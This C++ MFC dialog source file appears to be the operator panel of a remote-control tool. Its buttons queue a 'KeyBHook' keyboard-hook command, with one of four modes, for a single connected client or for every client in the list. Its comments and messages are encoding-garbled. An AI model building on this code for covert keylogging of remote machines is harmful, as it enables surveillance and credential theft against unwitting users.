// kbpanel.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "hisfoo.h"
#include "kbpanel.h"
#include "afxdialogex.h"


// kbpanel �Ի���

IMPLEMENT_DYNAMIC(kbpanel, CDialogEx)

kbpanel::kbpanel(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_DIALOG4, pParent)
{

}

kbpanel::~kbpanel()
{
}

void kbpanel::SetupFunc(unsigned long long Mode)
{
	CString CSTRBuf;
	CallBackEnv->GetDlgItemTextA(IDC_EDIT1, CSTRBuf);
	string SStr = CSTRBuf.GetString();
	unsigned long long SzNID = 1ULL;
	if (SStr != string(""))
	{
		stringstream NxSS;
		NxSS << SStr;
		NxSS >> SzNID;
	}
	else
	{
		MessageBox("������΢С������\n��ָ�ɺ��ִ�����", "�����ϻ�����", 0U);
		return;
	}
	auto Pcs_Com = [&](unsigned long long UID, ChisfooDlg::CLData userData)
	{
		if (CallBackEnv->WorkMap.find(UID) == CallBackEnv->WorkMap.end())
		{
			CallBackEnv->WorkMap.insert(make_pair(UID, list<ChisfooDlg::CLData>()));
		}
		CallBackEnv->WorkMap[UID].push_back(userData);
	};
	ChisfooDlg::CLData SzCDATA;
	SzCDATA.Method = KeyBHook;
	shared_ptr<byte>_pUmode(new byte[sizeof(unsigned long long)]);
	memcpy(&*_pUmode, (char*)&Mode, sizeof(unsigned long long));
	SzCDATA.Data.push_back(_pUmode);
	if (SzNID == 0ULL)
	{
		for (auto UListTor = CallBackEnv->userList.begin(); UListTor != CallBackEnv->userList.end(); UListTor++)
		{
			Pcs_Com(UListTor->CID, SzCDATA);
		}
	}
	else
	{
		Pcs_Com(SzNID, SzCDATA);
	}
	CallBackEnv->MessagePcs("�ɹ���Ӽ����������...");
	return;
}

void kbpanel::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(kbpanel, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &kbpanel::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &kbpanel::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &kbpanel::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &kbpanel::OnBnClickedButton4)
END_MESSAGE_MAP()


// kbpanel ��Ϣ�������


void kbpanel::OnBnClickedButton1()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������	
	SetupFunc(1ULL);
}


void kbpanel::OnBnClickedButton2()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	SetupFunc(2ULL);
}


void kbpanel::OnBnClickedButton3()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	SetupFunc(3ULL);
}


void kbpanel::OnBnClickedButton4()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	SetupFunc(4ULL);
}
